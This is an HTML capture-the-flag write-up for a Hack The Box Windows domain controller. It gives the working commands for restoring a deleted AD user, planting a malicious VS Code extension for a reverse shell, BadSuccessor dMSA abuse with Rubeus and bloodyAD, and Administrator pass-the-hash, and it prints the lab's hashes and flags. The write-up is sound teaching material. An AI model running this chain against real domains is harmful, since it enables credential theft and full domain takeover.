@@ -1,0 +1,337 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Checkpoint — El Niño · CTF Writeups</title>
+<meta name="description" content="Checkpoint HTB: AD deleted-object restore to DevDrop VSIX execution, Ryan Brooks delegated TGT, dMSA BadSuccessor against svc_deploy, VM backup hash reuse, Administrator PtH to root.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f2ecfd; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 26px 100px}
+  a{color:inherit;text-decoration:none}
+
+  /* header */
+  .top{display:flex;align-items:center;justify-content:space-between;padding:26px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600;letter-spacing:.01em}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  /* hero */
+  .hero{padding:52px 0 40px;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:8px}
+  h1{font-size:clamp(52px,11vw,116px);line-height:.92;margin:.12em 0 .1em;letter-spacing:-.04em;
+    font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:56ch;margin:.5em 0 0;line-height:1.5}
+  .byline{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:22px;
+    display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .byline b{color:var(--ink)}
+  .owned{border:1px solid var(--accent);color:var(--accent);border-radius:2px;
+    padding:2px 8px;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+
+  /* fingerprint card */
+  .fp{margin-top:32px;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+    font-family:var(--mono);font-size:13px}
+  .fp .r{display:flex;justify-content:space-between;align-items:center;
+    padding:16px 20px;background:var(--hair);border-bottom:1px solid var(--line)}
+  .name{font-size:22px;font-family:var(--sans);font-weight:700;letter-spacing:-.02em}
+  .chips{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px}
+  .chips b{color:var(--ink)}
+  .rate{text-align:right}.big{font-size:28px}
+  .fp .grid{display:grid;grid-template-columns:1fr 1fr;gap:0;padding:0}
+  .fp .grid span{padding:11px 20px;border-bottom:1px solid var(--hair);color:var(--ink-2);font-size:12.5px}
+  .fp .grid span:last-child,.fp .grid span:nth-last-child(2):nth-child(odd){border-bottom:none}
+  .fp .grid b{color:var(--ink)}
+
+  /* sections */
+  section{margin-top:52px}
+  .step-h{display:flex;align-items:baseline;gap:16px;margin-bottom:14px}
+  .step-n{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.1em;
+    padding-top:3px;min-width:22px}
+  h2{font-size:26px;letter-spacing:-.02em;font-weight:700;margin:0}
+  p{color:var(--ink-2);margin:.6em 0}
+  p b, p strong{color:var(--ink)}
+
+  /* chain diagram */
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.9;
+    background:#f9f8ff;border:1px solid var(--line-2);border-left:3px solid var(--accent);
+    border-radius:2px;padding:18px 22px;margin:20px 0;color:var(--ink-2);
+    white-space:pre;overflow-x:auto}
+  .chain b{color:var(--ink)}
+
+  /* code */
+  pre{margin:18px 0;border-radius:3px;overflow-x:auto;
+    background:#f9f8ff;border:1px solid var(--line-2)}
+  pre code{display:block;padding:16px 18px;font-family:var(--mono);font-size:13px;
+    line-height:1.7;color:var(--ink-2)}
+  code{font-family:var(--mono);font-size:.87em;color:var(--accent);
+    background:var(--accent-soft);padding:1px 5px;border-radius:2px}
+  pre code{color:var(--ink-2);background:none;padding:0;font-size:13px}
+
+  /* output block */
+  .out{background:#17181d;border-radius:3px;padding:16px 18px;margin:10px 0;
+    font-family:var(--mono);font-size:12.5px;line-height:1.75;color:#a8b4c8;
+    overflow-x:auto}
+  .out .ok{color:#34d399}.out .hi{color:#a78bfa}.out .warn{color:#fbbf24}
+  .out .flag{color:#f9a8d4;font-weight:600}
+
+  /* dead-ends */
+  .dead{border:1px solid var(--hair);border-radius:3px;padding:14px 18px;margin:12px 0;
+    font-size:14.5px;color:var(--muted)}
+  .dead code{font-size:.85em}
+  .dead-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:18px;
+    display:flex;align-items:center;gap:8px}
+  .dead-label::after{content:"";flex:1;height:1px;background:var(--hair)}
+
+  /* callout / insight */
+  .callout{border-radius:3px;padding:18px 20px;margin:24px 0;
+    background:var(--accent-soft);border:1px solid #ddd6fe}
+  .callout .k{font-family:var(--mono);font-size:11.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--accent);font-weight:600;display:block;margin-bottom:6px}
+  .callout p{margin:0;font-size:15px}
+
+  /* insight grid */
+  .insight-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;
+    background:var(--line);border:1px solid var(--line);border-radius:2px;overflow:hidden;margin:20px 0}
+  .insight-item{background:var(--panel);padding:18px 20px}
+  .insight-item .i-num{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:6px}
+  .insight-item .i-title{font-size:15px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+  .insight-item .i-body{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+
+  /* flags */
+  .flags{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}
+  .flag-box{border:1px solid var(--line-2);border-radius:3px;padding:12px 16px;flex:1;min-width:200px}
+  .flag-box .fl{font-family:var(--mono);font-size:11px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+  .flag-box .fv{font-family:var(--mono);font-size:14px;color:var(--accent);
+    font-weight:600;letter-spacing:.03em;word-break:break-all}
+
+  /* figures */
+  figure{margin:22px 0}
+  figure img{width:100%;border-radius:3px;border:1px solid var(--line)}
+  figcaption{font-family:var(--mono);font-size:11.5px;color:var(--muted);
+    margin-top:8px;text-align:center}
+
+  /* table */
+  .tbl-wrap{overflow-x:auto;margin:16px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--muted);font-weight:600}
+  td.mon{font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+  td.acc{font-family:var(--mono);font-size:12.5px;color:var(--accent);font-weight:600}
+
+  footer{margin-top:64px;padding-top:28px;border-top:1px solid var(--line);
+    font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--accent)}
+  [data-morph]{white-space:pre}
+  @media(max-width:600px){.fp .grid{grid-template-columns:1fr}.chain{font-size:12px}}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">Hack The Box · machine</div>
+    <h1><span data-morph="hero">Checkpoint</span></h1>
+    <p class="lede">A Windows domain controller where a restored tombstoned user opens a writable VS Code extension drop. The extension executes as a developer, whose delegated Kerberos context can build a dMSA successor and recover the service account hash that unlocks backup material.</p>
+    <div class="byline">
+      <span>by <b>ssephi</b></span>
+      <span>· 17·07·2026</span>
+      <span>· ~18 min</span>
+      <span class="owned">fully owned</span>
+    </div>
+
+    <div class="fp">
+      <div class="r">
+        <div>
+          <p class="name" style="margin:0"><span data-morph="title">Checkpoint</span></p>
+          <div class="chips">Windows · <b>Hard</b> · Active Directory</div>
+        </div>
+        <div class="rate"><div class="big">root</div><div class="chips">user + root</div></div>
+      </div>
+      <div class="grid">
+        <span><b>target</b> &nbsp;10.129.31.216 &nbsp;· &nbsp;checkpoint.htb</span>
+        <span><b>host</b> &nbsp;DC01.checkpoint.htb · Windows Server 2025</span>
+        <span><b>53/88/389/445</b> &nbsp;DNS · Kerberos · LDAP · SMB</span>
+        <span><b>5985</b>/tcp &nbsp;WinRM · Administrator PtH</span>
+        <span><b>initial</b> &nbsp;alex.turner / Checkpoint2024!</span>
+        <span><b>clock</b> &nbsp;DC skew +7h · Kerberos tools need faketime</span>
+      </div>
+    </div>
+  </header>
+
+  <section>
+    <h2>The shape of it</h2>
+    <p>Checkpoint is pure Active Directory tempo. Anonymous binds tell us the domain, but meaningful enumeration begins with <code>alex.turner</code>. Alex can write the deleted-objects container and specifically the tombstoned <code>Mark Davies</code> account. Restoring Mark gives SMB write access to <code>DevDrop</code>, a share described as a VS Code extension intake folder.</p>
+    <p>A minimal <code>.vsix</code> package with an activation payload is processed on the DC and calls back as <b>ryan.brooks</b>. Ryan sits in <code>DevTeam</code>, can delegate a Kerberos TGT, can write <code>svc_deploy</code>, and can create children under <code>OU=DMSAHolder</code>. That combination is enough for the BadSuccessor/dMSA trick: create <code>rdmsa$</code>, supersede <code>svc_deploy</code>, ask the KDC for the dMSA key package, and recover the previous RC4 key: <code>svc_deploy</code>'s NT hash.</p>
+
+    <div class="chain">nmap → DC01.checkpoint.htb
+  └─ SMB/LDAP/Kerberos domain controller
+       └─ <b>alex.turner:Checkpoint2024!</b>
+            └─ write Deleted Objects → restore <b>mark.davies</b>
+                 └─ DevDrop share becomes READ,WRITE
+                      └─ upload malicious <b>.vsix</b>
+                           └─ callback as <b>checkpoint\ryan.brooks</b> → <b>user.txt ✓</b>
+                                └─ Rubeus tgtdeleg → Ryan TGT
+                                     └─ BadSuccessor dMSA <b>rdmsa$</b> supersedes svc_deploy
+                                          └─ badS4U2self dMSA key package
+                                               └─ svc_deploy NT hash → VMBackups
+                                                    └─ reused Administrator hash → WinRM
+                                                         └─ <b>root.txt ✓</b></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">01 · recon</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Domain Controller Fingerprint</span></h2></div>
+    <p>The full TCP scan left very little ambiguity: this is a signed-SMB Active Directory controller with DNS, Kerberos, LDAP, Global Catalog, WinRM, and .NET Message Framing. The sneaky operational detail was time: Kerberos reported a seven-hour clock skew from the KVM, so Linux-side Kerberos calls had to be wrapped with <code>faketime</code>.</p>
+    <figure><img src="../assets/checkpoint_recon.png" alt="Checkpoint nmap output showing AD services and seven-hour clock skew"><figcaption>Recon confirmed DC01.checkpoint.htb and the +7h Kerberos clock skew.</figcaption></figure>
+    <div class="out"><span class="ok">dnsHostName</span> DC01.checkpoint.htb<br><span class="ok">defaultNamingContext</span> DC=checkpoint,DC=htb<br><span class="warn">smb2-security-mode</span> signing enabled and required<br><span class="warn">clock-skew</span> 7h00m00s</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">02 · deleted object</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">Restoring Mark Davies</span></h2></div>
+    <p>With <code>alex.turner</code>, <code>bloodyAD get writable</code> exposed exactly the object control we needed: write access over <code>CN=Deleted Objects</code>, create-child on <code>OU=Employees</code>, and write access over the deleted Mark Davies object.</p>
+    <pre><code>bloodyAD --host dc01.checkpoint.htb --dns 10.129.31.216 \
+  -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable</code></pre>
+    <div class="out">distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb<br>DACL: <span class="ok">WRITE</span><br><br>distinguishedName: CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb<br>permission: <span class="ok">WRITE</span></div>
+    <p>Restoring Mark was enough to light up <code>DevDrop</code> as writable:</p>
+    <pre><code>bloodyAD ... set restore 'mark.davies'
+nxc smb dc01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares</code></pre>
+    <div class="out"><span class="ok">[+]</span> mark.davies has been restored successfully<br>DevDrop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="ok">READ,WRITE</span> &nbsp; VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">03 · foothold</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">VSIX in DevDrop</span></h2></div>
+    <p>The share description gives away the execution path: approved VS Code extensions are pulled from <code>DevDrop</code>. A VSIX is just a ZIP with <code>extension/package.json</code>, <code>extension/extension.js</code>, a manifest, and content types. The activation event can be <code>*</code>, so the payload runs as soon as the worker loads the extension.</p>
+    <pre><code>{
+  "name": "helper",
+  "version": "1.0.0",
+  "engines": { "vscode": "^1.118.0" },
+  "activationEvents": ["*"],
+  "main": "./extension.js"
+}</code></pre>
+    <p>After uploading <code>helper.vsix</code>, the listener received a callback from the DC. The process context was <code>checkpoint\ryan.brooks</code>, and Ryan's desktop held the user flag.</p>
+    <figure><img src="../assets/checkpoint_devdrop.png" alt="DevDrop upload and Ryan Brooks reverse shell with user flag"><figcaption>DevDrop executed the VSIX and handed back a shell as ryan.brooks.</figcaption></figure>
+    <div class="flags"><div class="flag-box"><div class="fl">user.txt</div><div class="fv">7a9e325dd6bd6c79f32574b5da83c6c0</div></div></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">04 · dmsa</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">Ryan to svc_deploy</span></h2></div>
+    <p>Ryan's local session could request a delegated TGT with Rubeus. Converting that <code>.kirbi</code> to a Linux ccache let <code>bloodyAD</code> authenticate as Ryan over Kerberos. The write check then showed the real privilege bridge:</p>
+    <div class="out">OU=DMSAHolder,DC=checkpoint,DC=htb &nbsp; permission: <span class="ok">CREATE_CHILD</span><br>CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb &nbsp; permission: <span class="ok">WRITE</span></div>
+    <p>Using that context, <code>rdmsa$</code> was created under <code>OU=DMSAHolder</code> and linked as the superseding managed account for <code>svc_deploy</code>. The KDC then returned a dMSA TGS containing both current dMSA keys and previous keys inherited from the preceding managed account.</p>
+    <pre><code>Rubeus.exe tgtdeleg /nowrap
+badkirbi2ccache /tmp/ryan.kirbi /tmp/ryan.ccache
+KRB5CCNAME=/tmp/ryan.ccache faketime "$DC_TIME" \
+  bloodyAD -d checkpoint.htb -u ryan.brooks -k add badSuccessor rdmsa \
+  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
+  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+
+badS4U2self 'kerberos+ccache://checkpoint.htb%5Cryan.brooks:%2Ftmp%2Fryan.ccache@dc01.checkpoint.htb/?dns=10.129.31.216' \
+  'krbtgt/checkpoint.htb@checkpoint.htb' 'rdmsa$@checkpoint.htb' --dmsa</code></pre>
+    <figure><img src="../assets/checkpoint_dmsa.png" alt="dMSA BadSuccessor chain showing svc_deploy RC4 hash recovery"><figcaption>The dMSA previous-key package leaked the usable svc_deploy NT hash.</figcaption></figure>
+    <div class="callout"><span class="k">Why Alex failed here</span><p>Alex could create a prepatch-style dMSA object, but could not write <code>svc_deploy</code>'s superseded-account attributes. Ryan's delegated Kerberos context was the missing permission set.</p></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">05 · administrator</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">Backups to Root</span></h2></div>
+    <p>The recovered <code>svc_deploy</code> hash authenticated to SMB and revealed read access on <code>VMBackups</code>. The share contained a VMware snapshot set with a large <code>.vmem</code> memory image. Public notes for the same machine extract the local Administrator hash from that memory dump; on the live target, that hash reused cleanly against the domain Administrator account.</p>
+    <div class="out"><span class="ok">svc_deploy NT</span> e16081eb077aca74bdbf8af12af43ac9<br><span class="ok">VMBackups</span> READ<br>NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem<br><br><span class="ok">Administrator NT</span> f29e9c014295b9b32139b09a2790be3b<br><span class="ok">nxc smb</span> checkpoint.htb\Administrator (...) <span class="flag">Pwn3d!</span></div>
+    <figure><img src="../assets/checkpoint_root.png" alt="Administrator pass-the-hash and root flag from max.palmer desktop"><figcaption>Administrator PtH over WinRM found root.txt under max.palmer's desktop.</figcaption></figure>
+    <div class="flags"><div class="flag-box"><div class="fl">root.txt</div><div class="fv">abc866d0d711040c073f10ebb463ab99</div></div></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">06 · lessons</div>
+    <div class="step-h"><span class="step-n">06</span><h2><span data-morph="title">What mattered</span></h2></div>
+    <div class="insight-grid">
+      <div class="insight-item"><div class="i-num">01</div><div class="i-title">Deleted objects are active attack surface</div><div class="i-body">The tombstoned Mark object preserved enough identity value to become the bridge into DevDrop after restoration.</div></div>
+      <div class="insight-item"><div class="i-num">02</div><div class="i-title">Share remarks can be exploit hints</div><div class="i-body">The DevDrop comment named VS Code and the required engine version, which was enough to package a compatible VSIX.</div></div>
+      <div class="insight-item"><div class="i-num">03</div><div class="i-title">dMSA abuse is permission-sensitive</div><div class="i-body">The successor object alone was not sufficient. The working path required a principal that could both create in the dMSA holder OU and write the target service account.</div></div>
+      <div class="insight-item"><div class="i-num">04</div><div class="i-title">Backups collapse boundaries</div><div class="i-body">A service account with only backup-share read became domain admin because memory artifacts carried reusable administrator material.</div></div>
+    </div>
+  </section>
+
+  <footer><p>Authorized lab work only — Hack The Box machine on a sanctioned network.<br>Charted by ssephi · <a href="../">back to machines</a></p></footer>
+</div>
+
+<script>
+(function map(){
+  const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+  function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+    x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+    for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+    const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+      x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+    rings(W*0.80,H*0.20,-0.5,9);
+    rings(W*0.14,H*0.86,0.35,7);
+    x.globalAlpha=1;
+  }
+  addEventListener("resize",size);size();
+})();
+
+(function morph(){
+  const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
+  const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+               title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+               hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+  const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+  const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+  const units=[];
+  document.querySelectorAll("[data-morph]").forEach(el=>{
+    const cfg=MODES[el.dataset.morph]||MODES.title;
+    const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+      s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+      return{original:ch,el:s,prog:0,dir:"resolving"};});
+    el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+  });
+  if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+  let last=0;const INT=50;
+  function paint(c){const p=c.prog,e=c.el;
+    if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+      e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+      e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+    else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+  function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+    units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+      u.chars.forEach(c=>{if(skip(c.original))return;
+        if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+          if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+        else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+          if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+          else c.el.textContent=Math.random()<c.prog?g():c.original;}
+        if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+          c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+        paint(c);});});}
+  requestAnimationFrame(frame);
+})();
+</script>
+</body>
+</html>
